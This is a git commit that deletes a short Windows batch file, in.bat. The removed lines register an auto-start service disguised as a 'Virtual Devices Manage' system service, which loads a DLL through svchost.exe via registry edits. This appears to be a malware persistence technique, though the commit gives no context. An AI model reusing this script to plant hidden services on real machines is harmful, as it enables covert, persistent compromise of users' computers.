b12cec46b379f01d1d43c15f69b287e74d492307
yusupovau <a.yusupovau@outlook.com>
2024-11-13 03:45:00 -0500

    Delete in.bat

--- in.bat
+++
@@ -1,5 +0,0 @@
-sc create VDM binPath= "%SystemRoot%\system32\svchost.exe -k VDM" type= share start= auto DisplayName= "Virtual Devices Manage"
-sc description VDM "Provides management services for virtual devices."
-reg add HKLM\SYSTEM\CurrentControlSet\services\VDM\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\VDM.dll /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v VDM /t REG_MULTI_SZ /d VDM /f
-sc start VDM
